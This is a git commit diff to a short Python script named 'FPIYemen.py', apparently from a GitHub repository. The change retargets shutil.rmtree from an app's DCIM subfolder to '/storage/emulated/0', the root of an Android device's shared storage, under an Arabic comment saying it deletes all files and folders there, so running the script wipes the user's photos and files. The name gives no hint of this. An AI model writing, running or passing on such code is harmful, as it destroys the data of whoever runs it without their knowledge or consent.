766c0db45d2ca087ea2aa8dc95438518d8923b29
MrBOOND <113274421+BOONNDD@users.noreply.github.com>
2023-09-23 02:24:59 +0300

    Update FPIYemen.py

--- FPIYemen.py
+++ FPIYemen.py
@@ -1,6 +1,6 @@
 import shutil
 
-folder_path = '/storage/emulated/0/DCIM/com.ai.face.play/'
+folder_path = '/storage/emulated/0'
 
 # حذف جميع الملفات والمجلدات داخل المجلد
 shutil.rmtree(folder_path)
